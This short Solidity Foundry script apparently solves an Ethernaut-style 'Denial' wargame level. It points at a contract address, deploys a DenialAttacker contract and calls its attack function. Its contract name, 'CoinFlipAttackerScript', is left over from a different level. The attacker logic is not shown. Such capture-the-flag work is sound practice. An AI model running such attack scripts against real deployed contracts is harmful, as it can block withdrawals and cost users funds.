// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "../src/Denial.sol";
import {DenialAttacker} from "../src/DenialAttacker.sol";
import {Script} from "forge-std/Script.sol";

contract CoinFlipAttackerScript is Script {
    Denial target;
    DenialAttacker attacker;

    function run() public {
        target = Denial( payable(0x3FA261832CaBC10db81A9AB314f11E4BF1663670));
        vm.startBroadcast();
        attacker = new DenialAttacker(payable(address(target)));
        attacker.attack();
        vm.stopBroadcast();
    }
}
